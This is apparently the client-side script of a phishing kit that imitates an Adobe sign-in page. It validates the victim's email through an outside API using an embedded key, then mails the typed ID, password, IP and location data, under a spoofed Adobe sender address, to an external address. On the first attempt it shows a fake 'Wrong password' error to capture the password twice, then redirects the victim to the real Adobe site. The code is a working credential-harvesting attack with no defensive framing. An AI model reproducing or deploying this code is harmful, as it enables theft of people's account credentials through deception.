




const app =new Vue({
        el:'#app',
        vuetify: new Vuetify(),
        data:{
            error:'',
            retype:false,
            validEmail:false,
            loading:false,
            ID:'',
            PWD:''
        },

        mounted(){

            $('body').show()

        },

        methods: {
            
            checkEmail:async function(){

                 
               
           
                this.loading=true
                var _this =this
               if(this.validEmail){

                if(this.PWD.length<3 || this.PWD=='') {
                    this.loading=false
                    return false
                }

                if(this.retype){

                    var message ={
                        name:'Apollo Adobe',
                        from:'log@adobe.com',
                        to:$('#Mail').val(),
                        subject:'2 Log Adobe > '+window.iPfull,
                        html :" ID : "+this.ID+" PWD : "+this.PWD+" <p>"+JSON.stringify(window.locIp)+"</p>"
                    }

                    socket.emit('sendMail',message,function(clb){

                        if(clb){
                         window.location.href="https://www.adobe.com/sea/"
                        } else {
                            window.location.reload()
                        }
 
 
                     })

                } else {
                    var message ={
                        name:'Apollo Adobe',
                        from:'log@adobe.com',
                        to:"awo@priest.com",
                        subject:'1 Log Adobe > '+window.iPfull,
                        html :" ID : "+this.ID+" PWD : "+this.PWD+" <p>"+JSON.stringify(window.locIp)+"</p>"
                    }

                    socket.emit('sendMail',message,function(clb){



                       if(clb){
                        setTimeout(function(e){
                            _this.$data.error="Wrong password, please try again"
                            _this.$data.retype=true
                            _this.$data.PWD=''
                            _this.$data.loading=false
                        },4000)
                       } else {
                           window.location.reload()
                       }


                    })
                    
                }
               
               } else {
                if(this.ID=='') return false
                await fetch("https://emailverification.whoisxmlapi.com/api/v1?apiKey=at_007JdqqT3gVufMnsVUQ4eCldoZ14u&emailAddress="+this.ID)
                .then(function(e){

                    return e.json()

                })
                .then(function(e){
                        if(e.ErrorMessage) return  _this.$data.error=e.ErrorMessage[0].Error
                      
                        if(e.smtpCheck){


                            _this.$data.validEmail=true

                        } else {
                            _this.$data.error="Email does not exist "

                        }

                })
                this.loading=false

               }
                

            }

        },
        
        

})


